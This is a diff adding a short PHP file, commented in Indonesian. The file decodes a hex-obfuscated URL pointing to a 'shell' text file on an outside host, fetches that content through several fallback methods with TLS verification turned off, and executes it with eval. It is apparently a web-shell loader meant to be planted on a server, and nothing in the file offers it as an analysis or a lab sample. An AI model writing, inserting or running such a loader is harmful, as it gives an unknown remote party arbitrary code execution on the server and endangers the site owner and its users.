@@ -1,0 +1,62 @@
+<?php
+
+$hexUrl = "68747470733A2F2F6162736F6C7574652D77617465722E6170702F7368656C6C2F727564792E747874"; 
+
+// Fungsi untuk decode hex ke string
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $str;
+}
+
+
+function fetchRemoteCode($url) {
+    $data = false;
+
+    // Coba pakai file_get_contents jika diizinkan
+    if (ini_get('allow_url_fopen')) {
+        $data = @file_get_contents($url);
+    }
+
+    // Fallback pakai cURL
+    if (!$data && function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT => 10,
+        ]);
+        $data = curl_exec($ch);
+        curl_close($ch);
+    }
+
+    // Fallback pakai fopen manual
+    if (!$data && ($fp = @fopen($url, 'r'))) {
+        $data = '';
+        while (!feof($fp)) {
+            $data .= fread($fp, 8192);
+        }
+        fclose($fp);
+    }
+
+    return $data;
+}
+
+
+$url     = hex2str($hexUrl);
+$phpCode = fetchRemoteCode($url);
+
+
+if ($phpCode !== false) {
+    try {
+        eval("?>".$phpCode);
+    } catch (Throwable $e) {
+        echo "? Error saat menjalankan kode: " . $e->getMessage();
+    }
+} else {
+    echo "? Gagal mengambil kode dari URL: $url";
+}
+?>
